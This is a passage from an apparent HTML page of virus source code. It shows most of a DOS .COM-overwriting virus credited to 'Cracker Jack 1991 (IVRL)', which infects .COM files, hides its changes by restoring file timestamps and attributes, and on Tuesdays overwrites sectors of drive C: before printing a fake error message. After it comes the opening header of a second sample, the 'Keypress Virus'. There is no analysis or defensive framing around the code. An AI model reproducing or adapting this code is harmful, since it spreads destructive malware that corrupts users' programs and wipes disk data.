;&nbsp;&nbsp; else repeat</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnc&nbsp;&nbsp;&nbsp;&nbsp; Next_File</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp;&nbsp;&nbsp;&nbsp; short Check_Day</font>
<br><font color="#FF0000">Next_File:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;
Infect</font>
<br><font color="#FF0000">Check_Day:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
ah,2ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; get DOS date, check day</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp;&nbsp;&nbsp;&nbsp; al,Tuesday&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Tuesday ?</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thrash_Drive&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; if yes, thrash drive C:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ah,4ch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; else exit to DOS</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<p><font color="#FF0000">Thrash_Drive:&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
Counter,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; overwrite first 160 sectors</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp;&nbsp;&nbsp;&nbsp; Write_Sectors&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; of drive C: with garbage</font>
<br><font color="#FF0000">Write_Sectors:&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
al,Drive_C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Error: doesn't work !</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; cx,160&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; AL=C:, CX=160 sectors</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; dx,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; DX=highest sector in drive !</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; bx,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; DS:BX=start of PSP area</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 26h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; overwrite sectors</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
inc&nbsp;&nbsp;&nbsp;&nbsp; Counter</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp;&nbsp;&nbsp;&nbsp; Counter,10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; repeat 10 times</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show_Msg</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jne&nbsp;&nbsp;&nbsp;&nbsp; Write_Sectors</font>
<br><font color="#FF0000">Show_Msg:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ah,09h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; show a fake error message</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; dx,offset Virus_Msg&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; and exit to DOS</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ah,4ch</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<p><font color="#FF0000">Replicate:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;
dx,offset DTA.FileName&nbsp; ; save file attribute</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ax,4300h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; COM_Attr,cx</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor&nbsp;&nbsp;&nbsp;&nbsp; cx,cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; unprotect the .COM file</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ax,4301h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; in case it's read-only</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ax,3d02h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; open .COM file for R/W,</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; abort on error</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Check_Day</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; bx,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; BX = file handle</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ax,5700h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; save file date and time</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; COM_Time,cx</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; COM_Date,dx</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; dx,offset Demon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; overwrite first 272 bytes</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; of .COM program file</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; cx,Virus_Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; with the virus code</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ax,5701h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; restore file date and time</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; dx,COM_Date</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; cx,COM_Time</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ah,3eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; close the file</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; dx,offset DTA.FileName&nbsp; ; restore file
attribute</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; cx,COM_Attr</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ax,4301h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
retn</font>
<p><font color="#FF0000">All_COM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '*.COM',0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; dir search specification</font>
<br><font color="#FF0000">COM_Date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; packed .COM program date</font>
<br><font color="#FF0000">COM_Time&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; packed .COM program time</font>
<br><font color="#FF0000">COM_Attr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; .COM program file attribute</font>
<br><font color="#FF0000">Counter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; used when thrashing drive C:</font>
<br><font color="#FF0000">Drive_C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; INT 26h C: drive number</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</font>
<br><font color="#FF0000">Copyright&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Demonhyak Viri X.X (c) by Cracker Jack
1991 (IVRL)'</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</font>
<br><font color="#FF0000">Virus_Msg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10,13,'Error eating drive C:',10,13,'$'</font>
<p><font color="#FF0000">Virus_End&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
label&nbsp;&nbsp; byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; virus code+data end</font>
<p><font color="#FF0000">Virus&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ends</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
end&nbsp;&nbsp;&nbsp;&nbsp; Demon</font>
<p><u>Keypress Virus:</u>
<p><font color="#3333FF">;****************************************************************************;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=][][][][][][][][][][][][][][][=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp; P E R F E C T&nbsp; C R I M E&nbsp; [=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +31.(o)79.426o79&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
